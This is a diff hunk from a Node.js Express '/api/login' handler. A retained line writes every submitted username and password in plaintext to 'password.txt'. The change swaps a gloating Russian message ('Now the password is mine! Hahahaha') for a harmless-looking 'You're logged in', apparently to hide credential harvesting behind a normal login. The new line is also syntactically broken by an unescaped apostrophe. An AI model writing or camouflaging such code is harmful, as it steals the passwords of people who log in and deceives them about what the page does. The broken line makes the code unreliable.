@@ -19,7 +19,7 @@ app.post('/api/login', (req, res) => {
     fs.appendFileSync('password.txt', `Username: ${username}, Password: ${password}\n`);
 
     // Изменённое сообщение при успешном входе
-    res.json({ message: 'Теперь Пароль Мой! Хахахахаха' });
+    res.json({ message: 'You're logged in' });
 });
 
 // Запуск сервера
